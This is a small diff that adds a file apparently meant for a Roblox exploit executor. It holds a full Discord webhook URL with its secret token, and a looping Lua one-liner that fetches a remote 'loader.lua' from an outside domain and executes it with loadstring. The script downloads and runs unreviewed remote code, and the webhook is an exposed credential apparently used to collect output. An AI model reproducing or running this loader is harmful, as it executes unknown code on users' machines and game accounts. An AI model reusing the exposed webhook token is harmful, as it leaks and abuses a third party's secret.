@@ -1,0 +1,5 @@
+webhook:
+https://discord.com/api/webhooks/1249262772789710858/T9QhECTAkZGBL9kXDHv0esG6ih6aVjT5knSsBluMKDszbO7pBwFkdbDZy9bXr-6s8lrB
+
+script:
+repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(20)until Joebiden
